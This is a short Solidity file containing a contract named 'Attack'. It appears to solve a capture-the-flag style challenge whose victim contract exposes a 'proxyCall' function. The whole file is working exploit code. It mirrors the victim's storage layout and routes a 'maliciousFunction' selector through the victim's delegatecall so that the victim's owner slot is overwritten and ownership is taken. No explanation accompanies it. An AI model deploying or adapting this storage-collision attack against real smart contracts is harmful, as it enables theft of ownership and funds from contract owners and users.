// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    uint256 var0;
    uint8 var1;
    string private var2;
    address private var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result; 
    address internal immutable victim;
    address public newOwner;

    constructor(address _victim) {
        victim = _victim;
        var0 = 12345;
        var1 = 32;
        var2 = ""; 
        var3 = address(0);
        var4 = 0;
        owner = msg.sender; 
    }

    function maliciousFunction() external {
        owner = newOwner;
    }

    function exploit() external {
        newOwner = msg.sender;

        bytes4 selector = bytes4(keccak256("maliciousFunction()"));
        bytes memory data = abi.encodeWithSelector(selector);

        (bool success,) = victim.call(
            abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, data)
        );
        require(success, "Delegatecall failed");
    }
}
